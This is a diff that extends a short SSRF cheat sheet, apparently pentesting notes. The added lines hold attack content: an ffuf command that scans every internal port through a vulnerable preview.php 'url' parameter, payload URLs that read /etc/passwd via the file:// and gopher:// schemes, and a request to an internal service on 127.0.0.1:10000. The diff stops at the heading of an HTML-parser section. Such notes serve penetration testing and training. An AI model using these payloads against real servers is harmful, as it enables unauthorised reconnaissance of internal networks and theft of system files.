@@ -1,6 +1,26 @@
 # SSRF
 
-View internal system files by abusing SSRF
+View internal system files by abusing SSRF, or scan for internal ports via SSRF.
+
+## Scan Internal Ports
+
+    ffuf -u 'http://TARGET_IP/preview.php?url=http://127.0.0.1:FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0
+
+## GET requests
+
+Access internal files with "file" protocol
+
+    http://TARGET_IP/preview.php?url=file:///etc/passwd
+
+Gopher protocol
+
+    http://TARGET_IP/preview.php?url=gopher:///etc/passwd
+
+Access internal applications (Results from the internal port scanning)
+
+    http://TARGET_IP/preview.php?url=http://127.0.0.1:10000
+
+## HTML content parser
 
 ### 1) Create an HTML file with this content
 
